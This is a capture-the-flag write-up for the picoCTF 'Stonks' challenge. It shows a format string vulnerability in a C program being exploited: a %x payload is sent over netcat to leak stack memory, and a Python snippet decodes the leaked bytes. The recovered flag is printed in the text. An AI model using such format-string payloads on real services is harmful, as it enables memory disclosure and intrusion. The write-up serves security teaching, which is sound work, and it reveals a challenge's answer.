Description - 
I decided to try something noone else has before. I made a bot to automatically trade stonks for me using AI and machine learning. I wouldn't believe you if you told me it's unsecure! vuln.c nc mercury.picoctf.net 33411

Hint-
Okay, maybe I'd believe you if you find my API key.

$ wget <vuln.c file>
$ nano vuln.c

On line 66, "char api_buf[FLAG_BUFFER]", we see that that flag is living on the stack. On line 93 we see "printf(user_buff)". This is a format string vulnerability (as there is nothing in quotation marks, so we can specify a format string ie enter multiple %x to walk up and print out everything that is on the stack.)

$ nc mercury.picoctf.net 33411
(Select option 1 to buy some stonks. When prompted to enter API token, enter:)
$ %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
 
Output:
Buying stonks with token:
8ed3390804b00080489c3f7f85d80ffffffff18ed1160f7f93110f7f85dc708ed218018ed33708ed33906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6334326136613431ffaf007df7fc0af8f7f934404ddef800
Portfolio as of Mon Mar  7 22:03:16 UTC 2022


1 shares of Z
2 shares of PKD
2 shares of HF
33 shares of F
21 shares of DV
Goodbye!

Convert the hex string into ASCII:
ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿ¯

Write a python script to reverse the string:
s = 'ocip{FTC0l_I4_t5m_ll0m_y_y3nc42a6a41ÿ¯'
for x in range(0,len(s),4):
    print(s[x+3]+s[x+2]+s[x+1]+s[x],end='')

Output:
picoCTF{I_l05t_4ll_my_m0n3y_a24c14a6}

FORMAT STRING VULNERABILITY
- user-supplied input is included in the format string argument, which allows attackers to control the location where they perform arbitrary writes.
- vulnerability exists when a developer fails to perform reliable input validation checks
